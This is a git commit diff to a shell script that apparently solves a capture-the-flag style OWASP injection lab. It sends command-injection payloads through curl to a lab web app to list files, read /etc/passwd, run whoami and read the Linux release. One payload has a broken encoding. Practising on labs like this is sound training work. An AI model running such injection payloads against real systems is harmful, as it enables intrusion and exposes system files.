f7c8243b480199b80ef4346a07a0e6b0b4cb8f59
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-11-30 20:49:43 -0500

    Testing script

--- rooms/owasptop102021/3-injection.sh
+++ rooms/owasptop102021/3-injection.sh
@@ -16,8 +16,17 @@ echo "1 - LISTING ROOT FILES"
 curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28ls%29" > /work/ls.html
 echo "--> Files are : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/ls.html)"
 
-
 # Listing users
 echo "2 - LISTING USERS"
 curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28cat+%2Fetc%2Fpasswd%29" > /work/passwd.html
 echo "--> Users are : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/passwd.html)"
+
+# Current user
+echo "3 - GETTING APP OWNER"
+curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28whoami%29" > /work/whoami.html
+echo "--> App run as : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/whoami.html)"
+
+# Linux release
+echo "4 - GETTING LINUX VERSION"
+curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28cat+%2Fetc%lsb_release%29" > /work/release.html
+echo "--> Linux version is : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/release.html)"
